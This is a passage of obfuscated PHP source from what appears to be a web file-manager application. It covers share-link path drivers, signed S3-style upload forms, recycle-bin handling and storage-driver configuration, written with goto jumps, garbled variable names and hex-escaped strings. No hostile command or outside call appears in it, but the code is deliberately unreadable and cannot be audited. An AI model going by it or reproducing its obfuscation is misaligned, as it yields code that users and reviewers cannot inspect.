Action($Bù÷¹ÆÏ¥‚[1190])->_shareItemeParse($d«˜³‡ì“œ, $cá“ñ‚§šÑ); } public function listAll($AÀ×§·é) { $D¿ê„Ó§·Œ =& $_SERVER[µ…]; $b™ã¦ºÒ• = IO::listAll($AÀ×§·é); $f¹íê¾Ù = $this->pathParse[$D¿ê„Ó§·Œ[460]]; foreach ($b™ã¦ºÒ• as &$dØ–Ñ®±) { check_abort(); $dØ–Ñ®± = array_merge(IO::info($dØ–Ñ®±[$D¿ê„Ó§·Œ[75]]), $dØ–Ñ®±); $dØ–Ñ®±[$D¿ê„Ó§·Œ[84]] = Action($D¿ê„Ó§·Œ[1190])->_shareItemeParse($dØ–Ñ®±, $f¹íê¾Ù); } unset($dØ–Ñ®±); return $b™ã¦ºÒ•; } public function getPathOuter($fµ ¶“ßß™) { goto dİÜ‹ˆÏ¶¿; AÈáíèæØ: $Dì°İ‰¨ = KodIO::clear($fµ ¶“ßß™); $E§®‚Ï™Ü³ = KodIO::clear($this->pathParse[$b„‚¦è‘àä[460]][$b„‚¦è‘àä[1048]]); $CÌÊ¡­ùº = substr($Dì°İ‰¨, strlen($E§®‚Ï™Ü³)); goto dÊ¶å°½­ñ; dÊ¶å°½­ñ: if (substr($Dì°İ‰¨, 0, strlen($E§®‚Ï™Ü³)) != $E§®‚Ï™Ü³) { return !1; } return $this->pathParse[$b„‚¦è‘àä[1042]] . $b„‚¦è‘àä[8] . ltrim($CÌÊ¡­ùº, $b„‚¦è‘àä[8]); goto bó®Ã‡„“Ö; dİÜ‹ˆÏ¶¿: $b„‚¦è‘àä =& $_SERVER[µ…]; $FİÃµøÆŸ = KodIO::parse($fµ ¶“ßß™); if ($FİÃµøÆŸ[$b„‚¦è‘àä[29]] == KodIO::KOD_SHARE_ITEM) { return $FİÃµøÆŸ[$b„‚¦è‘àä[75]]; } goto AÈáíèæØ; bó®Ã‡„“Ö: } public function getType() { $fïÏ¦æ—Ó¡ =& $_SERVER[µ…]; $d••½¥ªÌƒ = str_replace($fïÏ¦æ—Ó¡[71], $fïÏ¦æ—Ó¡[33], get_class($this)); return strtolower($d••½¥ªÌƒ); } public function isTypeObject($Føƒ´†Â¹Ô) { return IO::isTypeObject($Føƒ´†Â¹Ô); } public function info($dß™Ä×ï…Í) { return $this->infoParse($dß™Ä×ï…Í); } public function infoAuth($a«†ïÙĞÊ) { return $this->infoParse($a«†ïÙĞÊ); } public function infoWithChildren($b‹Í«¿œ§ñ) { return $this->infoParse($b‹Í«¿œ§ñ, !0); } public function infoFull($fÃÙÚ×Òæ°) { return $this->infoParse($fÃÙÚ×Òæ°); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($D½¿ÌÌĞ”¢) { $this->pathParse = $D½¿ÌÌĞ”¢; } protected function infoParse($B²Õ‚™«È¥, $Fğ”ğ‚òİ = false) { $A‚Œ–ÓŠÇ© =& $_SERVER[µ…]; return Action($A‚Œ–ÓŠÇ©[1047])->sharePathInfo($this->pathParse[$A‚Œ–ÓŠÇ©[75]], !0, $Fğ”ğ‚òİ); } public function listPath($F®Ò×ÖÍ±, $f‹´ˆ»‡—‘ = false) { $a¡¿´­¾Å =& $_SERVER[µ…]; $Eí²ğÓÔ¼è = IO::listPath($F®Ò×ÖÍ±, $f‹´ˆ»‡—‘); foreach ($Eí²ğÓÔ¼è as $eçâ„Æíá => $E¿ÔñŠ•Ñé) { if (!in_array($eçâ„Æíá, array($a¡¿´­¾Å[73], $a¡¿´­¾Å[74]))) { continue; } foreach ($E¿ÔñŠ•Ñé as $EÚƒ¿ïöÍÆ => $cÄËùğ°´â) { $cÄËùğ°´â = Action($a¡¿´­¾Å[1199])->parsePathChildren($cÄËùğ°´â, array($a¡¿´­¾Å[408] => $F®Ò×ÖÍ±)); $Eí²ğÓÔ¼è[$eçâ„Æíá][$EÚƒ¿ïöÍÆ] = Action($a¡¿´­¾Å[1047])->shareItemInfo($cÄËùğ°´â); } } return $Eí²ğÓÔ¼è; } public function listAll($d×øÎ¤ŒãÖ) { $Cùİ†ĞÈ³Ç =& $_SERVER[µ…]; $BˆĞ´‰¹ô = IO::listAll($d×øÎ¤ŒãÖ); foreach ($BˆĞ´‰¹ô as &$C ¥ß…Â’) { $C ¥ß…Â’ = array_merge(IO::info($C ¥ß…Â’[$Cùİ†ĞÈ³Ç[75]]), $C ¥ß…Â’); $C ¥ß…Â’[$Cùİ†ĞÈ³Ç[84]] = Action($Cùİ†ĞÈ³Ç[1047])->shareItemInfo($C ¥ß…Â’); } unset($C ¥ß…Â’); return $BˆĞ´‰¹ô; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($aôåÚâÛ¨¹) { parent::__construct($aôåÚâÛ¨¹); $this->signatureVersion($_SERVER[µ…][210]); } public function uploadFormData($AÍØ ¨ÊÑ¢, $eÅ§´Ê ¾Š = 3600) { goto F©òÆôµÔÒ; eˆ’Úí×·ğ: $e×ØÆß…´ = $fç„„óšôÉ[59]; $C¼½Æ¥ŞË¦ = gmdate($fç„„óšôÉ[1201]); $B²¯¯ØÉ«£ = gmdate($fç„„óšôÉ[705]); goto A¾¢²òæ‰; FÛƒãÀ•òë: $aèî¿§ÙíÖ = base64_encode(json_encode($b¾Û½´ÅŠ)); $bìÊÅÀš½ = hash_hmac($fç„„óšôÉ[1210], $B²¯¯ØÉ«£, $fç„„óšôÉ[1211] . $this->secret, !0); $fÅ ìœ™ó = hash_hmac($fç„„óšôÉ[1210], $this->region, $bìÊÅÀš½, !0); goto b†ÁãíŒ×; aŞ¢±×²—ˆ: $e¼ãÒìÓ¯ = array($this->accessKey, $B²¯¯ØÉ«£, $this->region, $e×ØÆß…´, $bØÉòØˆ¥); $d‡®áƒ®«á = implode($fç„„óšôÉ[8], $e¼ãÒìÓ¯); $b¾Û½´ÅŠ = array($fç„„óšôÉ[1166] => gmdate($fç„„óšôÉ[1165], strtotime($fç„„óšôÉ[1203])), $fç„„óšôÉ[1167] => array(array($fç„„óšôÉ[1169] => $this->bucket), array($fç„„óšôÉ[1168] => $EğïÍà÷ÈÅ), array($fç„„óšôÉ[1170], $fç„„óšôÉ[1171], $fç„„óšôÉ[33]), array($fç„„óšôÉ[1170], $fç„„óšôÉ[1204], $fç„„óšôÉ[33]), array($fç„„óšôÉ[1170], $fç„„óšôÉ[1205], $fç„„óšôÉ[33]), array($fç„„óšôÉ[1172] => $fˆÒœ»ë×•), array($fç„„óšôÉ[1206] => $d‡®áƒ®«á), array($fç„„óšôÉ[1207] => $D¼¿¹‰ªË), array($fç„„óšôÉ[1208] => $C¼½Æ¥ŞË¦), array($fç„„óšôÉ[1209] => $D¿µİ—ã))); goto FÛƒãÀ•òë; F÷æ‡²³¯Ë: $E‹¿’“Æµà = array($fç„„óšôÉ[209] => $fç„„óšôÉ[33], $fç„„óšôÉ[1212] => $fç„„óšôÉ[33], $fç„„óšôÉ[1168] => $EğïÍà÷ÈÅ, $fç„„óšôÉ[1172] => $fˆÒœ»ë×•, $fç„„óšôÉ[1176] => $aèî¿§ÙíÖ, $fç„„óšôÉ[1213] => $d‡®áƒ®«á, $fç„„óšôÉ[1214] => $D¼¿¹‰ªË, $fç„„óšôÉ[1215] => $C¼½Æ¥ŞË¦, $fç„„óšôÉ[1216] => $D¿µİ—ã, $fç„„óšôÉ[1217] => $DÃ¸ÎäØ½Š, $fç„„óšôÉ[174] => $this->getHost()); return $E‹¿’“Æµà; goto Fâ…öÕº‚; A¾¢²òæ‰: $bØÉòØˆ¥ = $fç„„óšôÉ[1202]; $D¿µİ—ã = $eÅ§´Ê ¾Š . $fç„„óšôÉ[33]; $fˆÒœ»ë×• = $fç„„óšôÉ[1164]; goto aŞ¢±×²—ˆ; b†ÁãíŒ×: $C…ùÑï¢ = hash_hmac($fç„„óšôÉ[1210], $e×ØÆß…´, $fÅ ìœ™ó, !0); $aùÉœá–”„ = hash_hmac($fç„„óšôÉ[1210], $bØÉòØˆ¥, $C…ùÑï¢, !0); $DÃ¸ÎäØ½Š = hash_hmac($fç„„óšôÉ[1210], $aèî¿§ÙíÖ, $aùÉœá–”„); goto F÷æ‡²³¯Ë; F©òÆôµÔÒ: $fç„„óšôÉ =& $_SERVER[µ…]; $EğïÍà÷ÈÅ = $fç„„óšôÉ[190]; $D¼¿¹‰ªË = $fç„„óšôÉ[1200]; goto eˆ’Úí×·ğ; Fâ…öÕº‚: } } goto EÌ¦“ÙĞ™; BêõçÔÈ É: function binCheckBigger($eÚ ŸÙ¯â‚, $aÃø²Ÿ¬‡¦) { return $eÚ ŸÙ¯â‚ > $aÃø²Ÿ¬‡¦; } $_SERVER[$_SERVER[Ïó·ƒ][3]] = ("\x38\x38\x39\x31".base64_decode('NDM='))+0;$_jsYA="Gd9UaYthnwYP2rQ5H2Mg8dfg27amis6eQrE9snq4XUIcHAi9yfjSCbAQCgvYpCt7H";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($eæ™˜ïé¯¶, $BŠïÁ®æ‰Ä) { $C˜ÄÆ±Ûõ =& $_SERVER[µ…]; if (isset(self::$_methodList[$eæ™˜ïé¯¶])) { return @call_user_func_array(self::$_methodList[$eæ™˜ïé¯¶], $BŠïÁ®æ‰Ä); } else { if (method_exists($this, $eæ™˜ïé¯¶)) { return call_user_func_array(array($this, $eæ™˜ïé¯¶), $BŠïÁ®æ‰Ä); } else { think_exception(__CLASS__ . $C˜ÄÆ±Ûõ[4] . $eæ™˜ïé¯¶ . $C˜ÄÆ±Ûõ[5]); } } } public static function __callStatic($c¤²„Òì»„, $b¹‰ƒŒçÒí) { if (isset(self::$_methodListStatic[$c¤²„Òì»„])) { return call_user_func_array(self::$_methodListStatic[$c¤²„Òì»„], $b¹‰ƒŒçÒí); } else { if (method_exists(self, $c¤²„Òì»„)) { return call_user_func_array(array(self, $c¤²„Òì»„), $b¹‰ƒŒçÒí); } else { show_json("{$c¤²„Òì»„}\x28\51\x20\156\x6f\164\40\x65\x78\x69\163\x74\x3b", !1); } } } public static function addMethod($Cçïœ×µò, $Dñ¶É¼¬Õ­) { self::$_methodList[$Cçïœ×µò] = $Dñ¶É¼¬Õ­; } public static function addMethodStatic($F•Ûâ„­ñˆ, $eÍ«êĞ—ˆ») { self::$_methodListStatic[$F•Ûâ„­ñˆ] = $eÍ«êĞ—ˆ»; } } goto båÒ¤È¿ì£; b“¶ÚùÑ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\162\143\x65\137\x72\145\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\155\x65", "\164\x69\x6d\145", "\151\x6e\x73\145\162\x74", "\146\x75\156\x63\x74\x69\x6f\x6e")); public function listData($dÊäõê¤§ = false) { $f™Õ•É¨­Û =& $_SERVER[µ…]; $dÊäõê¤§ = $dÊäõê¤§ ? $dÊäõê¤§ : USER_ID; $Eˆñ¹ŠñÌ = $this->where(array($f™Õ•É¨­Û[1498] => $dÊäõê¤§))->select(); return array_to_keyvalue($Eˆñ¹ŠñÌ, $f™Õ•É¨­Û[33], $f™Õ•É¨­Û[390]); } public function moveToRecycle($B÷ë¦æ×) { goto c¯³ÕÁÖ¢; c¯³ÕÁÖ¢: $a†ÛšÍçŞ =& $_SERVER[µ…]; $f–Ş±õ£–ˆ = Model($a†ÛšÍçŞ[1181]); $cùùòî®­– = $f–Ş±õ£–ˆ->sourceInfo($B÷ë¦æ×); goto BÆ¤÷ÇãÑ–; BÆ¤÷ÇãÑ–: if (!$cùùòî®­– || $cùùòî®­–[$a†ÛšÍçŞ[417]] == $a†ÛšÍçŞ[86]) { return; } $EĞåÚŒ¦´˜ = array($a†ÛšÍçŞ[404] => $B÷ë¦æ×, $a†ÛšÍçŞ[1498] => USER_ID, $a†ÛšÍçŞ[544] => $cùùòî®­–[$a†ÛšÍçŞ[398]], $a†ÛšÍçŞ[545] => $cùùòî®­–[$a†ÛšÍçŞ[478]], $a†ÛšÍçŞ[548] => $cùùòî®­–[$a†ÛšÍçŞ[481]]); $this->add($EĞåÚŒ¦´˜); goto f¹Ê‚µ…¥±; f¹Ê‚µ…¥±: $this->recycleMove($B÷ë¦æ×, 1); if ($cùùòî®­–[$a†ÛšÍçŞ[397]] == $a†ÛšÍçŞ[86]) { $AºÊ»ÄÎ˜± = array($a†ÛšÍçŞ[548] => array($a†ÛšÍçŞ[507], $cùùòî®­–[$a†ÛšÍçŞ[481]] . $B÷ë¦æ× . $a†ÛšÍçŞ[508])); $f–Ş±õ£–ˆ->where($AºÊ»ÄÎ˜±)->setField($a†ÛšÍçŞ[417], 1); } goto AÕğÇ¦²ª¶; AÕğÇ¦²ª¶: } public function clear() { $this->remove(!1); } public function remove($D®²ŸÔ–¼ = false) { goto F·Ãá‡Â¯×; CÈ–ç©—Œ…: $D®²ŸÔ–¼ = $D®²ŸÔ–¼ === !1 ? !1 : $D®²ŸÔ–¼; $d½×¢‹áğ = array(); foreach ($a”Û°øÈî” as $d©Âšñ®ñâ) { if ($D®²ŸÔ–¼ != !1 && !in_array($d©Âšñ®ñâ, $D®²ŸÔ–¼)) { continue; } $C÷é›Ğ½„ö = $D¿æ•™’Š->sourceInfo($d©Âšñ®ñâ); $D¿æ•™’Š->remove($d©Âšñ®ñâ, !1); $F™›‚¼‚÷® = $C÷é›Ğ½„ö[$Cğ¶Ÿ¿ª¡Ş[398]] . $Cğ¶Ÿ¿ª¡Ş[70] . $C÷é›Ğ½„ö[$Cğ¶Ÿ¿ª¡Ş[478]]; $d½×¢‹áğ[$F™›‚¼‚÷®] = array($Cğ¶Ÿ¿ª¡Ş[544] => $C÷é›Ğ½„ö[$Cğ¶Ÿ¿ª¡Ş[398]], $Cğ¶Ÿ¿ª¡Ş[478] => $C÷é›Ğ½„ö[$Cğ¶Ÿ¿ª¡Ş[478]]); $this->where(array($Cğ¶Ÿ¿ª¡Ş[390] => $d©Âšñ®ñâ))->delete(); } goto f¾×¹ÃÚ®; f¾×¹ÃÚ®: foreach ($d½×¢‹áğ as $CêÑ´†ˆ‘œ) { $D¿æ•™’Š->targetSpaceUpdate($CêÑ´†ˆ‘œ[$Cğ¶Ÿ¿ª¡Ş[398]], $CêÑ´†ˆ‘œ[$Cğ¶Ÿ¿ª¡Ş[478]]); } goto Bçˆ§ŒÙà’; F·Ãá‡Â¯×: $Cğ¶Ÿ¿ª¡Ş =& $_SERVER[µ…]; $D¿æ•™’Š = Model($Cğ¶Ÿ¿ª¡Ş[1181]); $a”Û°øÈî” = $this->listData(); goto CÈ–ç©—Œ…; Bçˆ§ŒÙà’: } public function restore($BÍ¤¾‚×’† = false) { $D½ã‹°–è = $this->listData(); $this->_restoreSource($D½ã‹°–è, $BÍ¤¾‚×’†); } public function restoreUserAll($eµ·©Ÿ) { $BÛäÃõøÖ = $this->listData($eµ·©Ÿ); $this->_restoreSource($BÛäÃõøÖ, !1); } private function _restoreSource($fŞÌŠ¹Ãß, $A×—Û‰¶¦) { goto dµ¥„Şàµö; aÀ›ö÷¸¡: $d³äÓ¨Á¬á->updateModifyTime($c…¦ˆß¢¡”); goto B‚Ì«‚; dµ¥„Şàµö: $dÁÓÚ¼…“ =& $_SERVER[µ…]; $d³äÓ¨Á¬á = Model($dÁÓÚ¼…“[1181]); $A×—Û‰¶¦ = $A×—Û‰¶¦ == !1 ? !1 : $A×—Û‰¶¦; goto f‡²…³ğ‘; f‡²…³ğ‘: if (!$fŞÌŠ¹Ãß) { return !0; } $c…¦ˆß¢¡” = array(); foreach ($fŞÌŠ¹Ãß as $DÍˆÂß÷’²) { goto e£¥ªÉ²—á; d÷“¼±Ùõ: if ($D…­®»Â[$dÁÓÚ¼…“[397]] == $dÁÓÚ¼…“[86]) { $c•‹–±±Ä = array($dÁÓÚ¼…“[548] => array($dÁÓÚ¼…“[507], $D…­®»Â[$dÁÓÚ¼…“[481]] . $DÍˆÂß÷’² . $dÁÓÚ¼…“[508])); $d³äÓ¨Á¬á->where($c•‹–±±Ä)->setField($dÁÓÚ¼…“[417], 0); $this->restoreFolderChildren($DÍˆÂß÷’², $fŞÌŠ¹Ãß); } $this->where(array($dÁÓÚ¼…“[390] => $DÍˆÂß÷’²))->delete(); $d³äÓ¨Á¬á->folderSizeReset($D…­®»Â[$dÁÓÚ¼…“[472]]); goto BÛ½ô¦Ø; e£¥ªÉ²—á: if ($A×—Û‰¶¦ != !1 && !in_array($DÍˆÂß÷’², $A×—Û‰¶¦)) { continue; } $D…­®»Â = $d³äÓ¨Á¬á->sourceInfo($DÍˆÂß÷’²); $f‰ôŞÀ˜Ã = $d³äÓ¨Á¬á->sourceInfo($D…­®»Â[$dÁÓÚ¼…“[472]]); goto E”×ğìàÙÄ; BÛ½ô¦Ø: $c…¦ˆß¢¡”[] = $D…­®»Â[$dÁÓÚ¼…“[472]]; if ($D…­®»Â[$dÁÓÚ¼…“[397]] == $dÁÓÚ¼…“[86]) { $c…¦ˆß¢¡”[] = $DÍˆÂß÷’²; } $d³äÓ¨Á¬á->lockMoveEnd($DÍˆÂß÷’²); goto Eš¦Ã‰Ãï­; E”×ğìàÙÄ: if ($f‰ôŞÀ˜Ã[$dÁÓÚ¼…“[417]] == $dÁÓÚ¼…“[86]) { continue; } $d³äÓ¨Á¬á->lockMoveStart($DÍˆÂß÷’²); $this->recycleMove($DÍˆÂß÷’², 0); goto d÷“¼±Ùõ; Eš¦Ã‰Ãï­: } goto aÀ›ö÷¸¡; B‚Ì«‚: } private function restoreFolderChildren($D“øëÛÆÉï, $eÅÄÍòìô†) { goto d§ƒ…Ã³¸ç; c¶¼±Á¯Œ: $eÅ‹—‹ËÖ[$c™öç·’óò[390]][1] = array_unique($eÅ‹—‹ËÖ[$c™öç·’óò[390]][1]); $eÅ‹—‹ËÖ[$c™öç·’óò[935]] = $c™öç·’óò[1757]; $B ÅƒÈ¿»->where($eÅ‹—‹ËÖ)->setField($c™öç·’óò[417], 1); goto eë®åƒÃ™; d§ƒ…Ã³¸ç: $c™öç·’óò =& $_SERVER[µ…]; $B ÅƒÈ¿» = Model($c™öç·’óò[1181]); $eÅ‹—‹ËÖ = array($c™öç·’óò[390] => array($c™öç·’óò[7], array())); goto E—‹¤„Øœ; E—‹¤„Øœ: foreach ($eÅÄÍòìô† as $AŠğÍ«ŸƒŠ) { if ($AŠğÍ«ŸƒŠ == $D“øëÛÆÉï) { continue; } if (!$B ÅƒÈ¿»->isParentOf($D“øëÛÆÉï, $AŠğÍ«ŸƒŠ)) { continue; } $DÎ—Ãåİñô = $B ÅƒÈ¿»->sourceInfo($AŠğÍ«ŸƒŠ); if ($DÎ—Ãåİñô[$c™öç·’óò[397]] == $c™öç·’óò[86]) { $eÅ‹—‹ËÖ[] = array($c™öç·’óò[548] => array($c™öç·’óò[507], $DÎ—Ãåİñô[$c™öç·’óò[481]] . $AŠğÍ«ŸƒŠ . $c™öç·’óò[508])); } else { $eÅ‹—‹ËÖ[$c™öç·’óò[390]][1][] = $AŠğÍ«ŸƒŠ; } } if (!$eÅ‹—‹ËÖ[$c™öç·’óò[390]][1]) { unset($eÅ‹—‹ËÖ[$c™öç·’óò[390]]); } if (!$eÅ‹—‹ËÖ) { return; } goto c¶¼±Á¯Œ; eë®åƒÃ™: } private function recycleMove($CŸ†ëÂÀï„, $dœğá¬»ëÉ = 1) { $c¦“‹ØùÁ =& $_SERVER[µ…]; $EÈ³¬ñ¯Âª = Model($c¦“‹ØùÁ[1181]); $C¾•ÂÅÔŒå = Model($c¦“‹ØùÁ[1965]); $CÆ®†Êğ… = array($c¦“‹ØùÁ[390] => $CŸ†ëÂÀï„); if ($dœğá¬»ëÉ) { $EÈ³¬ñ¯Âª->where($CÆ®†Êğ…)->setField($c¦“‹ØùÁ[417], 1); $C¾•ÂÅÔŒå->eventRecycle($CŸ†ëÂÀï„, $c¦“‹ØùÁ[1966]); } else { $a·Õë÷õ¿Ù = $EÈ³¬ñ¯Âª->where($CÆ®†Êğ…)->find(); $d°˜ñÁ­‡ = $a·Õë÷õ¿Ù[$c¦“‹ØùÁ[397]] == $c¦“‹ØùÁ[86]; $A¯Œç¹è¢ = $EÈ³¬ñ¯Âª->fileNameAuto($a·Õë÷õ¿Ù[$c¦“‹ØùÁ[472]], $a·Õë÷õ¿Ù[$c¦“‹ØùÁ[28]], REPEAT_RENAME_FOLDER, $d°˜ñÁ­‡); if ($A¯Œç¹è¢ != $a·Õë÷õ¿Ù[$c¦“‹ØùÁ[28]]) { $EÈ³¬ñ¯Âª->rename($CŸ†ëÂÀï„, $A¯Œç¹è¢); } $EÈ³¬ñ¯Âª->where($CÆ®†Êğ…)->setField($c¦“‹ØùÁ[417], 0); $C¾•ÂÅÔŒå->eventRecycle($CŸ†ëÂÀï„, $c¦“‹ØùÁ[1967]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\163\164\x6f\162\141\147\145\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\145", "\163\x69\172\x65\x4d\x61\x78", "\163\x79\163\164\x65\x6d", "\x64\x65\x66\x61\x75\x6c\x74", "\x64\162\x69\x76\145\x72", "\x63\x6f\x6e\146\151\147"); public function listData($bº‡Õ—ª· = false, $eÏİ¨²ë¥ = "\155\x6f\144\151\x66\171\x54\x69\x6d\145", $b÷›İ´£× = false) { $BíŒğ››ç =& $_SERVER[µ…]; $B±®ƒ¾’Ÿ² = parent::listData($bº‡Õ—ª·, $eÏİ¨²ë¥, $b÷›İ´£×); if ($bº‡Õ—ª·) { return $B±®ƒ¾’Ÿ²; } $Aù‡ŞÙë… = $this->ioSizeUseGet(array_to_keyvalue($B±®ƒ¾’Ÿ², $BíŒğ››ç[33], $BíŒğ››ç[388])); foreach ($B±®ƒ¾’Ÿ² as $eêÇÜì„‰ˆ => $FÆÀ„‹°ö) { unset($B±®ƒ¾’Ÿ²[$eêÇÜì„‰ˆ][$BíŒğ››ç[6]]); $B±®ƒ¾’Ÿ²[$eêÇÜì„‰ˆ][$BíŒğ››ç[1655]] = isset($Aù‡ŞÙë…[$FÆÀ„‹°ö[$BíŒğ››ç[388]]]) ? $Aù‡ŞÙë…[$FÆÀ„‹°ö[$BíŒğ››ç[388]]] : 0; } return $B±®ƒ¾’Ÿ²; } public function ioSizeUseGet($B—ˆŞ´ê’„) { goto E¨Šì©ÅŒ; D¬¿”¦ë‰è: Cache::set($cÙ„õÕãÍã, $DÂÙ¸é‘, 60); return $DÂÙ¸é‘; goto B¹ÒÛµ×©–; E¨Šì©ÅŒ: $d«•ğö½ÀË =& $_SERVER[µ…]; if (!$B—ˆŞ´ê’„) { return array(); } $cÙ„õÕãÍã = $d«•ğö½ÀË[1968] . implode($d«•ğö½ÀË[47], $B—ˆŞ´ê’„); goto e½›í™Èã; CÌê¯öõß«: $F•ÜŞ»»Ş = array($d«•ğö½ÀË[762] => array($d«•ğö½ÀË[7], $B—ˆŞ´ê’„)); $DÂÙ¸é‘ = Model($d«•ğö½ÀË[733])->field($Cî¯‡˜ïĞÄ)->where($F•ÜŞ»»Ş)->group($d«•ğö½ÀË[762])->select(); $DÂÙ¸é‘ = array_to_keyvalue($DÂÙ¸é‘, $d«•ğö½ÀË[388], $d«•ğö½ÀË[77]); goto D¬¿”¦ë‰è; e½›í™Èã: $DÂÙ¸é‘ = Cache::get($cÙ„õÕãÍã); if ($DÂÙ¸é‘) { return $DÂÙ¸é‘; } $Cî¯‡˜ïĞÄ = array($d«•ğö½ÀË[762] => $d«•ğö½ÀË[388], $d«•ğö½ÀË[1969] => $d«•ğö½ÀË[77]); goto CÌê¯öõß«; B¹ÒÛµ×©–: } public function getConfig($cÍÊ²Š‚­ß) { $a¼¤¹Ş‘£å = parent::listData($cÍÊ²Š‚­ß); return json_decode($a¼¤¹Ş‘£å[$_SERVER[µ…][6]], !0); } public function update($D¼¡¢ğÍ¢°, $bÜÑ¤¸½Ú) { goto f÷Šùº¬“©; f÷Šùº¬“©: $a¡ë†ğ–ëï =& $_SERVER[µ…]; $a…Ù¡ìÒ = $bÜÑ¤¸½Ú[$a¡ë†ğ–ëï[28]]; $a³©‰†ÀŠƒ = array_to_keyvalue(parent::listData(), $a¡ë†ğ–ëï[28]); goto E¨àÔÙĞè; eóç¿”²œğ: $a’†ß…œ” = parent::update($D¼¡¢ğÍ¢°, $bÜÑ¤¸½Ú); if ($a’†ß…œ” && $bÜÑ¤¸½Ú[$a¡ë†ğ–ëï[34]]) { foreach ($a³©‰†ÀŠƒ as $E³îëË‡È¤) { if ($E³îëË‡È¤[$a¡ë†ğ–ëï[34]] && $E³îëË‡È¤[$a¡ë†ğ–ëï[388]] != $D¼¡¢ğÍ¢°) { parent::update($E³îëË‡È¤[$a¡ë†ğ–ëï[388]], array($a¡ë†ğ–ëï[34] => 0)); } } } return $a’†ß…œ”; goto DêÑ¬ø­¼Ë; E¨àÔÙĞè: if (isset($a³©‰†ÀŠƒ[$a…Ù¡ìÒ]) && $a³©‰†ÀŠƒ[$a…Ù¡ìÒ][$a¡ë†ğ–ëï[388]] != $D¼¡¢ğÍ¢°) { return !1; } if (isset($bÜÑ¤¸½Ú[$a¡ë†ğ–ëï[1970]]) && $bÜÑ¤¸½Ú[$a¡ë†ğ–ëï[1970]] == $a¡ë†ğ–ëï[86]) { $this->checkConfig($bÜÑ¤¸½Ú); } unset($bÜÑ¤¸½Ú[$a¡ë†ğ–ëï[1970]]); goto eóç¿”²œğ; DêÑ¬ø­¼Ë: } public function add($e›…‰½íî±) { goto aŸùùğŞò˜; C¦§÷÷ÙÄ÷: return $Cñâ¸ì‘ËË; goto F½®Òí®°; aŸùùğŞò˜: $fÎÃ™ÕçÄ =& $_SERVER[µ…]; $bÊÇ’Üó¶ = array_to_keyvalue(parent::listData(), $fÎÃ™ÕçÄ[28]); if (isset($bÊÇ’Üó¶[$e›…‰½íî±[$fÎÃ™ÕçÄ[28]]])) { return !1; } goto DÛäÇ½Ğà; DÛäÇ½Ğà: $this->checkConfig($e›…‰½íî±); $Cñâ¸ì‘ËË = parent::insert($e›…‰½íî±); if ($Cñâ¸ì‘ËË && $e›…‰½íî±[$fÎÃ™ÕçÄ[34]]) { foreach ($bÊÇ’Üó¶ as $d–²—®ÂŸø) { if ($d–²—®ÂŸø[$fÎÃ™ÕçÄ[34]]) { parent::update($d–²—®ÂŸø[$fÎÃ™ÕçÄ[388]], array($fÎÃ™ÕçÄ[34] => 0)); } } } goto C¦§÷÷ÙÄ÷; F½®Òí®°: } public function checkConfig(&$C²©¯‰»œô) { goto b¿†£¦øê„; CÂ¯‡¸Ä˜Õ: $CÆ¨…’®·‹ = $e´Ä±Ÿ›²Ë->getPath($BÒ„ÉŞù . $AÜÜßåµ¹[1114]); if (!$e´Ä±Ÿ›²Ë->mkfile($CÆ¨…’®·‹)) { show_json(LNG($AÜÜßåµ¹[1975]), !1); } $CÎ•È°§İš[$AÜÜßåµ¹[1053]] = $BÒ„ÉŞù; goto FÇš—µ¶õ; fª„æñÒ‡: foreach ($CÎ•È°§İš as $Fò‰¬ËÛ› => $B²•ƒ“Ä) { $CÎ•È°§İš[$Fò‰¬ËÛ›] = trim($B²•ƒ“Ä); } $CÎ•È°§İš[$AÜÜßåµ¹[1971]] = rand_string(6); $dø¡¿¶‹Ø = $GLOBALS[$AÜÜßåµ¹[6]][$AÜÜßåµ¹[87]][$AÜÜßåµ¹[770]]; goto Cç‡›Ã’Åã; Cç‡›Ã’Åã: $BàŠ˜À„ = isset($dø¡¿¶‹Ø[$BšÛ›¸¼ãš]) ? $dø¡¿¶‹Ø[$BšÛ›¸¼ãš] : ucfirst($BšÛ›¸¼ãš); $dòÜôÁÔË = $AÜÜßåµ¹[71] . $BàŠ˜À„; if (!$BàŠ˜À„ || !class_exists($dòÜôÁÔË)) { write_log(array($AÜÜßåµ¹[1972], $C²©¯‰»œô, get_caller_info()), $AÜÜßåµ¹[1973]); show_json(LNG($AÜÜßåµ¹[1974]), !1, $C²©¯‰»œô); } goto Cë´ùÀ»ˆ›; b¿†£¦øê„: $AÜÜßåµ¹ =& $_SERVER[µ…]; $BšÛ›¸¼ãš = strtolower($C²©¯‰»œô[$AÜÜßåµ¹[93]]); $CÎ•È°§İš = json_decode($C²©¯‰»œô[$AÜÜßåµ¹[6]], !0); goto fª„æñÒ‡; FÇš—µ¶õ: $C²©¯‰»œô[$AÜÜßåµ¹[6]] = json_encode($CÎ•È°§İš); $C²©¯‰»œô[$AÜÜßåµ¹[93]] = $BàŠ˜À„; return !0; goto B×Èæß¹à‘; Cë´ùÀ»ˆ›: $e´Ä±Ÿ›²Ë = new $dòÜôÁÔË($CÎ•È°§İš); if (in_array($BšÛ›¸¼ãš, $e´Ä±Ÿ›²Ë->objectDriver)) { if (!$e´Ä±Ÿ›²Ë->isBucketCors() && !$e´Ä±Ÿ›²Ë->setBucketCors()) { $eÈİã„çÏ  = LNG($AÜÜßåµ¹[1975]); $eÈİã„çÏ  .= $AÜÜßåµ¹[1976] . LNG($AÜÜßåµ¹[1977]); show_json($eÈİã„çÏ , !1); } } $BÒ„ÉŞù = rtrim($CÎ•È°§İš[$AÜÜßåµ¹[1053]], $AÜÜßåµ¹[8]) . $AÜÜßåµ¹[8]; goto CÂ¯‡¸Ä˜Õ; B×Èæß¹à‘: } public function driverListSystem() { $F ”Œª¸»‘ =& $_SERVER[µ…]; $dÁŒÓÅÚ = parent::listData(); $b‡†ªïö‰ = array(); foreach ($dÁŒÓÅÚ as $b¼‹‹±¥¸) { unset($b¼‹‹±¥¸[$F ”Œª¸»‘[192]], $b¼‹‹±¥¸[$F ”Œª¸»‘[83]]); $b¼‹‹±¥¸[$F ”Œª¸»‘[6]] = json_decode($b¼‹‹±¥¸[$F 